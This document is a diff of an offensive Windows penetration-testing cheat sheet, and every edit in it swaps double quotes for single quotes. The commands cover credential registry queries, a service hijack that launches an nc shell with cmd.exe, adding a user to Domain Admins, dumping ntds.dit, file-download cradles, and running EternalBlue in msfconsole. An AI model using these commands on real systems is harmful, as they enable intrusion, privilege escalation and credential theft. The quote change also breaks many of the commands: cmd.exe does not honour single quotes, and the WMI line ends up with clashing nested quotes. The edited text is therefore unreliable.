@@ -9,7 +9,7 @@ systeminfo
 
 ## get info system limited
 ```
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+systeminfo | findstr /B /C:'OS Name' /C:'OS Version'
 ```
 
 ## find passwords
@@ -99,12 +99,12 @@ sc query
 
 ## list installed software (1)
 ```
-dir /a "C:\Program Files"
+dir /a 'C:\Program Files'
 ```
 
 ## list installed software (2)
 ```
-dir /a "C:\Program Files (x86)"
+dir /a 'C:\Program Files (x86)'
 ```
 
 ## list installed software (3)
@@ -114,7 +114,7 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE
 
 ## show lsa cached credentials value
 ```
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
 ```
 
 ## register query word password (1)
@@ -154,12 +154,12 @@ accesschk.exe /accepteula -ucqv <service_name>
 
 ## reconfigure service
 ```
-sc config <service> binpath= "C:\nc.exe -nv 127.0.0.1 4444 -e C:\WINDOWS\System32\cmd.exe"
+sc config <service> binpath= 'C:\nc.exe -nv 127.0.0.1 4444 -e C:\WINDOWS\System32\cmd.exe'
 ```
 
 ## change service
 ```
-sc config <service> obj= ".\LocalSystem" password= ""
+sc config <service> obj= '.\LocalSystem' password= ''
 ```
 
 ## start service
@@ -169,12 +169,12 @@ net start <service>
 
 ## check permission (1)
 ```
-accesschk.exe /accepteula -dqv "<file>"
+accesschk.exe /accepteula -dqv '<file>'
 ```
 
 ## check permission (2)
 ```
-cacls "<file>"
+cacls '<file>'
 ```
 
 ## find weak folder permission
@@ -192,7 +192,7 @@ accesschk.exe -uwqs Users <c>:\
 ## VBS download file script
 #cat/ATTACK/FILE_TRANSFERT
 ```
-echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js <file_url> > <downloaded_file>
+echo var WinHttpReq = new ActiveXObject('WinHttp.WinHttpRequest.5.1');WinHttpReq.Open('GET', WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js <file_url> > <downloaded_file>
 ```
 
 % windows, users
@@ -242,7 +242,7 @@ net users
 ## list domain admins (fr)
 #plateform/windows  #target/local #cat/RECON
 ```
-net group "Admins du domaine"
+net group 'Admins du domaine'
 ```
 
 ## infos about a user
@@ -253,7 +253,7 @@ net user <username>
 
 ## infos on a Administrator and retrieve SID
 ```powershell
-[wmi] "Win32_userAccount.Domain='<computer_name>',Name='Administrator'"
+[wmi] 'Win32_userAccount.Domain='<computer_name>',Name='Administrator''
 ```
 
 ## infos about password policy
@@ -304,7 +304,7 @@ echo %USERDNSDOMAIN%
 
 ## get computer domain name (3)
 ```
-systeminfo | findstr /B /C:"Domain"
+systeminfo | findstr /B /C:'Domain'
 ```
 
 ## get name of the DC
@@ -324,7 +324,7 @@ net group /domain
 
 ## list of computer connected to the domain
 ```
-net group "domain computers" /domain
+net group 'domain computers' /domain
 ```
 
 ## List all PCs of the domain
@@ -339,22 +339,22 @@ nltest /dclist:<domain>
 
 ## list pc accounts of domain controllers
 ```
-net group "Domain Controllers" /domain
+net group 'Domain Controllers' /domain
 ```
 
 ## List users with domain admin privileges
 ```
-net group "Domain Admins" /domain
+net group 'Domain Admins' /domain
 ```
 
 ## Add user to domain admin group
 ```
-net group "Domain Admins" <username> /add /domain
+net group 'Domain Admins' <username> /add /domain
 ```
 
 ## Add user to domain admin group - FR
 ```
-net group "Admins du domaine" <username> /add /domain
+net group 'Admins du domaine' <username> /add /domain
 ```
 
 ## List users that belongs to the administrators group inside the domain
@@ -448,13 +448,13 @@ netsh Advfirewall set allprofiles state on
 
 ## firewall open port RDP
 ```
-netsh firewall add portopening TCP 3389 "Remote Desktop"
+netsh firewall add portopening TCP 3389 'Remote Desktop'
 ```
 
 % windows, ntds.dit
 ## dump ntds.dit (Windows >= 2008 server) - method 1
 ```
-ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
+ntdsutil 'ac i ntds' 'ifm' 'create full c:\temp' q q
 ```
 ## dump ntds.dit (Windows >= 2008 server) - method 2
 ```
@@ -494,7 +494,7 @@ net share
 % windows, file, download
 ## windows download file with windows defender
 ```
-"c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\mpcmdrun.exe" -DownloadFile -url <url> -path <result_file>
+'c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\mpcmdrun.exe' -DownloadFile -url <url> -path <result_file>
 ```
 
 ## windows download file with windows defender
@@ -525,7 +525,7 @@ netdom trust <source_domain> /d:<target_domain> /enablesidhistory:yes
 % windows, cve
 ## windows eternal blue - smb - ms17-010
 ```
-msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"
+msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue'
 ```
 
 = interface: eth0
